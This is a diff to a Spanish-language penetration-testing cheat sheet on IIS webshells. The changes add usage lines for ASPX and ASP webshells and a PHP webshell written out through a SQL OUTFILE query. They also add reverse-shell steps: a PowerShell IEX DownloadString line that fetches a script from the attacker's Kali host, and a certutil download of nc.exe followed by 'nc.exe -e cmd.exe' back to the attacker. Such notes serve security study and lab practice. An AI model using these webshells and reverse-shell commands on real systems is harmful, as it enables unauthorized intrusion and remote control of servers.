@@ -427,7 +427,6 @@ SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/she
 ```
 
 ### ASPX / ASP — Webshells para IIS (Windows)
-
 ```aspx
 <%-- cmd.aspx → webshell básica para IIS --%>
 <%@ Page Language="C#" %>
@@ -445,6 +444,10 @@ SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/she
         p.WaitForExit();
     }
 %>
+
+
+# Acceder a la webshell subida
+❯ http://<IP>/cmd.aspx?cmd=whoami
 ```
 
 ```asp
@@ -460,6 +463,10 @@ If cmd <> "" Then
     Response.Write "<pre>" & oExec.StdOut.ReadAll() & "</pre>"
 End If
 %>
+
+
+# Acceder a la webshell subida
+❯ http://<IP>/cmd.asp?cmd=whoami
 ```
 
 ## Revershell Ejecutando desde un ASPX - Windows 
@@ -473,6 +480,16 @@ End If
 
 # Ejecutar reverse shell desde la webshell → URL encoded
 ❯ http://<IP>/cmd.aspx?cmd=powershell+-c+"IEX(New-Object+Net.WebClient).DownloadString('http://<IP_KALI>/Invoke-PowerShellTcp.ps1')"
+
+Opción 2:   <- MEJOR 
+# Subir el netcat 
+❯ http://<IP>/cmd.aspx?cmd=certutil -urlcache -f http://<IP>/nc.exe C:\Temp\nc.exe
+
+# Ejecutar la revershell 
+❯ http://<IP>/cmd.aspx?cmd=C:\Temp\nc.exe <IP_KALI> <PUERTO> -e cmd.exe
+
+NOTA: 
+	- Crear el dir 'C:\Temp' y ahi subir el Netcat 
 ```
 
 ```bash 
